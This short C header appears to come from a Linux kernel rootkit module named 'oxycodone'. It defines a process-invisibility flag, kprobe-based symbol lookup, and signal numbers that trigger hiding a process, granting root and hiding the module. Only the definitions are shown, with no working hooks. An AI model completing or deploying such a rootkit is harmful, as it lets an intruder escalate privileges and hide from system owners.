#define MODULE_NAME "oxycodone"
#define PF_INVISIBLE 0x10000000
#define KPROBE_LOOKUP 1

enum {
	SIGINVIS = 31,
	SIGSUPER = 64,
	SIGMODINVIS = 63,
};

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,0,0)
#else
#error Your kernel is not sufficiently updated to work with this
#endif